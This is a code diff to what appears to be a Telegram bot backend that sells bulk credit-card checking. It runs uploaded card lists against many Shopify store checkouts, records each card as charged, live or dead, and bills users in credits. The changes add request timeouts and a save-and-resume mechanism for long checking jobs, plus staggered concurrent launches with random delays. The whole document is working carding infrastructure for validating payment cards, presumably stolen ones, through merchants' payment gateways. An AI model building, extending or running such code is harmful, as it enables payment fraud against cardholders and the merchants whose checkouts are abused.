@@ -479,6 +479,8 @@ async function editTelegramMessage(
       parse_mode: "HTML",
     };
     if (replyMarkup) body.reply_markup = replyMarkup;
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10_000);
 
     const response = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
@@ -486,8 +488,10 @@ async function editTelegramMessage(
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(body),
+        signal: controller.signal,
       }
     );
+    clearTimeout(timeoutId);
 
     if (!response.ok) {
       console.error("Telegram edit error:", await response.json());
@@ -6188,7 +6192,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
       // TXT FILE SHOPIFY CHARGE (/mtxt) PRICE GROUP CALLBACK
       // ─────────────────────────────────────────────────────────
 
-      if (callbackData === "mtxt_nosite" || callbackData === "mtxt_pending" || callbackData.startsWith("mtxt_res_")) {
+      if (callbackData === "mtxt_nosite" || callbackData === "mtxt_pending" || (callbackData.startsWith("mtxt_res_") && !callbackData.startsWith("mtxt_resume_"))) {
         await answerCallbackQuery(update.callback_query.id, callbackData === "mtxt_nosite" ? "❌ No sites available" : callbackData === "mtxt_pending" ? "⏳ Still checking..." : "ℹ️ Card result");
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
@@ -6249,21 +6253,35 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
 
-       if (callbackData.startsWith("mtxt_") && !callbackData.startsWith("mtxt_nosite") && !callbackData.startsWith("mtxt_pending") && !callbackData.startsWith("mtxt_res_")) {
+       if (callbackData.startsWith("mtxt_") && !callbackData.startsWith("mtxt_nosite") && !callbackData.startsWith("mtxt_pending") && (!callbackData.startsWith("mtxt_res_") || callbackData.startsWith("mtxt_resume_"))) {
         const __mtxtCbQuery = update.callback_query!;
         const __mtxtWork = (async () => {
+        const mtxtIsResume = callbackData.startsWith("mtxt_resume_");
         const mtxtParts = callbackData.replace("mtxt_", "").split("_");
-        const mtxtPriceMin = parseInt(mtxtParts[0]);
-        const mtxtPriceMax = parseInt(mtxtParts[1]);
-        const mtxtBulkId = mtxtParts[2];
+        let mtxtPriceMin = mtxtIsResume ? 0 : parseInt(mtxtParts[0]);
+        let mtxtPriceMax = mtxtIsResume ? 100 : parseInt(mtxtParts[1]);
+        const mtxtBulkId = mtxtIsResume ? callbackData.replace("mtxt_resume_", "") : mtxtParts[2];
+        let mtxtLoadedState: any = null;
+        let mtxtResumeIndex = 0;
 
         // Fetch cards from DB
         const { data: mtxtBulkData } = await supabase.from("pending_bulk_checks").select("cards").eq("id", mtxtBulkId).maybeSingle();
         let mtxtCards: string[] = [];
-        if (mtxtBulkData?.cards) { mtxtCards = mtxtBulkData.cards.split("\n").filter((c: string) => c.trim()); }
-        await supabase.from("pending_bulk_checks").delete().eq("id", mtxtBulkId);
-        // Re-insert as stop-tracking record (use a valid dummy UUID for user_id)
-        await supabase.from("pending_bulk_checks").insert({ id: mtxtBulkId, cards: "RUNNING", chat_id: String(callbackChatId), user_id: "00000000-0000-0000-0000-000000000000" });
+        if (mtxtBulkData?.cards) {
+          try {
+            const parsedState = JSON.parse(mtxtBulkData.cards);
+            if (parsedState?.kind === "mtxt_job") {
+              mtxtLoadedState = parsedState;
+              mtxtCards = Array.isArray(parsedState.cards) ? parsedState.cards : [];
+              mtxtPriceMin = Number(parsedState.priceMin ?? mtxtPriceMin);
+              mtxtPriceMax = Number(parsedState.priceMax ?? mtxtPriceMax);
+              mtxtResumeIndex = Number(parsedState.nextIndex ?? 0);
+            }
+          } catch {}
+          if (!mtxtLoadedState) {
+            mtxtCards = mtxtBulkData.cards.split("\n").filter((c: string) => c.trim());
+          }
+        }
         if (!mtxtCards.length) {
           await answerCallbackQuery(__mtxtCbQuery.id, "❌ Card data expired or invalid");
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -6274,7 +6292,9 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
 
-        await answerCallbackQuery(__mtxtCbQuery.id, `⚡ Checking ${mtxtCards.length} cards on $${mtxtPriceMin}-$${mtxtPriceMax}...`);
+        if (!mtxtIsResume) {
+          await answerCallbackQuery(__mtxtCbQuery.id, `⚡ Checking ${mtxtCards.length} cards on $${mtxtPriceMin}-$${mtxtPriceMax}...`);
+        }
 
         const { data: mtxtProfile } = await supabase
           .from("profiles")
@@ -6290,10 +6310,11 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           await editTelegramMessage(callbackChatId, messageId, `🚫 <b>Account Suspended</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
-        if (mtxtProfile.credits < mtxtCards.length) {
+        if (!mtxtLoadedState && mtxtProfile.credits < mtxtCards.length) {
           await editTelegramMessage(callbackChatId, messageId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mtxtCards.length}</b> credits. Balance: <b>${mtxtProfile.credits}</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
+        const mtxtStartingCredits = Number(mtxtLoadedState?.startingCredits ?? mtxtProfile.credits);
 
         // Fetch all matching sites; default queries only return 1000 rows.
         const mtxtSites = await fetchShopifyGatewaySites(supabase, mtxtPriceMin, mtxtPriceMax);
@@ -6550,6 +6571,15 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
          let mtxtCharged = 0, mtxtApproved = 0, mtxtDeclined = 0, mtxtErrorCount = 0;
          let mtxtTotalCost = 0;
          const mtxtErrorCards: string[] = []; // Track cards that got errors for recheck
+          if (mtxtLoadedState) {
+            if (Array.isArray(mtxtLoadedState.results)) mtxtResults.push(...mtxtLoadedState.results);
+            if (Array.isArray(mtxtLoadedState.errorCards)) mtxtErrorCards.push(...mtxtLoadedState.errorCards);
+            mtxtCharged = Number(mtxtLoadedState.charged ?? 0);
+            mtxtApproved = Number(mtxtLoadedState.approved ?? 0);
+            mtxtDeclined = Number(mtxtLoadedState.declined ?? 0);
+            mtxtErrorCount = Number(mtxtLoadedState.errorCount ?? 0);
+            mtxtTotalCost = Number(mtxtLoadedState.totalCost ?? 0);
+          }
 
          // Build live update message + result buttons
          const mtxtAnimFrames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
@@ -6560,6 +6590,32 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
          let mtxtLastResponse = '—';
          let mtxtStopped = false;
          const mtxtStopKey = `mtxt_stop_${mtxtBulkId}`;
+          const mtxtPersistState = async (nextIndex: number, status = "running") => {
+            const { data: stillRunning } = await supabase.from("pending_bulk_checks").select("id").eq("id", mtxtBulkId).maybeSingle();
+            if (!stillRunning && status !== "completed") {
+              mtxtStopped = true;
+              return false;
+            }
+            const state = {
+              kind: "mtxt_job",
+              status,
+              cards: mtxtCards,
+              priceMin: mtxtPriceMin,
+              priceMax: mtxtPriceMax,
+              nextIndex,
+              results: mtxtResults,
+              errorCards: mtxtErrorCards,
+              charged: mtxtCharged,
+              approved: mtxtApproved,
+              declined: mtxtDeclined,
+              errorCount: mtxtErrorCount,
+              totalCost: mtxtTotalCost,
+              startingCredits: mtxtStartingCredits,
+              updatedAt: new Date().toISOString(),
+            };
+            await supabase.from("pending_bulk_checks").upsert({ id: mtxtBulkId, cards: JSON.stringify(state), chat_id: String(callbackChatId), user_id: mtxtProfile.user_id });
+            return true;
+          };
 
          const buildMtxtMessageAndButtons = (checked: number, total: number, elapsed: string, isComplete: boolean) => {
            const progressPct = total > 0 ? Math.round((checked / total) * 100) : 0;
@@ -6606,8 +6662,28 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
           // 50-thread concurrency with staggered launches — matches web Shopify Charge gateway.
           // Each batch advances to the next as soon as 49/50 cards complete (MIN_COMPLETE_BEFORE_NEXT below).
-          const MTXT_CONCURRENCY = Math.min(50, Math.max(1, mtxtCards.length));
-          const MTXT_STAGGER_MS_VAL = 120;
+          const MTXT_CONCURRENCY = Math.min(12, Math.max(1, mtxtCards.length));
+          const MTXT_STAGGER_MS_VAL = 100;
+          const MTXT_MAX_RUNTIME_MS = 105_000;
+          const MTXT_RESUME_DELAY_MS = 1_500;
+          let mtxtNeedsResume = false;
+          let mtxtNextResumeIndex = mtxtResumeIndex;
+          const mtxtScheduleResume = async (nextIndex: number) => {
+            const resumeCallback = `mtxt_resume_${mtxtBulkId}`;
+            const resumeUpdate = {
+              callback_query: {
+                id: `mtxt_resume_${Date.now()}`,
+                data: resumeCallback,
+                message: { chat: { id: Number(callbackChatId) }, message_id: messageId },
+              },
+            };
+            await new Promise(r => setTimeout(r, MTXT_RESUME_DELAY_MS));
+            await fetch(`${SUPABASE_URL}/functions/v1/telegram-webhook`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
+              body: JSON.stringify(resumeUpdate),
+            }).then(() => {}).catch((e) => console.error("[/mtxt resume] failed", e));
+          };
 
          // Throttled UI update - max 1 edit per 500ms, always send on force
          let mtxtLastEditTime = 0;
@@ -6630,7 +6706,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
            const mtxtElapsed = ((Date.now() - mtxtStartTime) / 1000).toFixed(2);
            const { data: mtxtUpdatedProfile } = await supabase.from("profiles").select("credits").eq("user_id", mtxtProfile.user_id).single();
-           const mtxtNewBalance = mtxtUpdatedProfile?.credits ?? (mtxtProfile.credits - mtxtTotalCost);
+            const mtxtNewBalance = mtxtUpdatedProfile?.credits ?? (mtxtStartingCredits - mtxtTotalCost);
 
            let mtxtFinalMsg = `📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘 — 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗</b>\n\n`;
            mtxtFinalMsg += mtxtStopped ? `🛑 <b>Stopped</b> — ${mtxtChecked}/${mtxtCards.length} checked\n` : `✅ <b>Process Completed</b>\n`;
@@ -6695,12 +6771,12 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
            } catch {}
          };
 
-         // Show initial processing message with animation
-          const initData = buildMtxtMessageAndButtons(0, mtxtCards.length, '0.00', false);
+          // Show initial/resumed processing message with animation
+           const initData = buildMtxtMessageAndButtons(mtxtResults.length, mtxtCards.length, '0.00', false);
          await editTelegramMessage(callbackChatId, messageId, initData.msg, { inline_keyboard: initData.buttons });
 
-         // Process card helper
-         let mtxtChecked = 0;
+          // Process card helper
+          let mtxtChecked = mtxtResults.length;
          let mtxtLastStopCheckAt = 0;
          const MTXT_STOP_CHECK_INTERVAL_MS = 5000; // poll DB stop flag at most every 5s
          const mtxtProcessCard = async (cardCC: string) => {
@@ -6763,7 +6839,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
             mtxtTotalCost += cardCost;
 
             if (result.status === 'live' || result.status === 'dead') {
-              await supabase.from("profiles").update({ credits: mtxtProfile.credits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
+              await supabase.from("profiles").update({ credits: mtxtStartingCredits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
               await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
             }
             // Don't insert error cards into card_checks - they'll be rechecked
@@ -6813,53 +6889,55 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
         // Staggered threaded session model (matching web Shopify gateway, adjusted for Telegram runtime)
          const mtxtQueue = mtxtCards.map(c => c.trim()).filter(c => c);
-         let mtxtQueueIdx = 0;
-         const MIN_COMPLETE_BEFORE_NEXT = 49;
-
-         // Safety timeout: very long upper bound — only fires for truly stuck runs.
-         // The job runs in EdgeRuntime.waitUntil so it isn't bound to the request lifecycle.
-         // Each card invokes shopify-charge-check (≤120s deadline); we allow up to 10 min total.
-         const MTXT_SAFETY_TIMEOUT = 600_000;
-         const mtxtSafetyTimer = setTimeout(async () => {
-           console.warn('[/mtxt] Safety timeout reached after 10min — finalizing.');
-           mtxtStopped = true;
-         }, MTXT_SAFETY_TIMEOUT);
+          let mtxtQueueIdx = Math.max(0, Math.min(mtxtResumeIndex, mtxtQueue.length));
 
           while (mtxtQueueIdx < mtxtQueue.length && !mtxtStopped) {
-           const batchEnd = Math.min(mtxtQueueIdx + MTXT_CONCURRENCY, mtxtQueue.length);
-           const batchCards = mtxtQueue.slice(mtxtQueueIdx, batchEnd);
-           const isLastBatch = batchEnd >= mtxtQueue.length;
+            if (Date.now() - mtxtStartTime > MTXT_MAX_RUNTIME_MS) {
+              mtxtNeedsResume = true;
+              mtxtNextResumeIndex = mtxtQueueIdx;
+              break;
+            }
 
-           await new Promise<void>((resolve) => {
-             let batchCompleted = 0;
-             const promises = batchCards.map(async (card, launchOrder) => {
-               if (mtxtStopped) return;
-               if (launchOrder > 0) {
-                 const launchDelay = launchOrder * MTXT_STAGGER_MS_VAL + Math.floor(Math.random() * 120);
-                 await new Promise(r => setTimeout(r, launchDelay));
-               }
-               if (mtxtStopped) return;
+            const batchEnd = Math.min(mtxtQueueIdx + MTXT_CONCURRENCY, mtxtQueue.length);
+            const batchCards = mtxtQueue.slice(mtxtQueueIdx, batchEnd);
 
-               await mtxtProcessCard(card);
-               batchCompleted++;
-               // For non-last batches, resolve early after 49 to start next batch
-               // For last batch, wait for ALL cards
-               if (!isLastBatch && batchCompleted >= Math.min(MIN_COMPLETE_BEFORE_NEXT, batchCards.length)) {
-                 resolve();
-               }
-             });
-             Promise.all(promises).then(() => resolve());
-           });
+            await Promise.all(batchCards.map(async (card, launchOrder) => {
+              if (mtxtStopped) return;
+              if (launchOrder > 0) {
+                const launchDelay = launchOrder * MTXT_STAGGER_MS_VAL + Math.floor(Math.random() * 120);
+                await new Promise(r => setTimeout(r, launchDelay));
+              }
+              if (mtxtStopped) return;
+              try {
+                await mtxtProcessCard(card);
+              } catch (e) {
+                console.error('[/mtxt] card worker failed', e);
+                const errCard: MtxtResult = { cc: card, status: 'error', response: 'Worker error', price: '$0.00', bank: 'N/A', flag: '🌍' };
+                mtxtResults.push(errCard);
+                mtxtCurrentCard = card.split("|")[0] || card;
+                mtxtLastResponse = 'Worker error';
+                mtxtErrorCount++;
+                mtxtErrorCards.push(card);
+                mtxtChecked++;
+                await mtxtFlushUpdate(true);
+              }
+            }));
 
-           mtxtQueueIdx = batchEnd;
-           if (mtxtQueueIdx < mtxtQueue.length && !mtxtStopped) {
-             await new Promise(r => setTimeout(r, 600));
-           }
-         }
+            mtxtQueueIdx = batchEnd;
+            if (!await mtxtPersistState(mtxtQueueIdx)) break;
+            if (mtxtQueueIdx < mtxtQueue.length && !mtxtStopped) {
+              await new Promise(r => setTimeout(r, 300));
+            }
+          }
 
-          clearTimeout(mtxtSafetyTimer);
-          // Now (and only now) it's safe to remove the stop-tracker row — every
-          // worker has finished, so no one else will poll it.
+          if (mtxtNeedsResume && !mtxtStopped) {
+            await mtxtPersistState(mtxtNextResumeIndex, "running");
+            await mtxtFlushUpdate(true);
+            await mtxtScheduleResume(mtxtNextResumeIndex);
+            return;
+          }
+
+          if (!mtxtStopped) await mtxtPersistState(mtxtQueue.length, "completed");
           await supabase.from("pending_bulk_checks").delete().eq("id", mtxtBulkId);
           await mtxtSendFinalMessage();
 
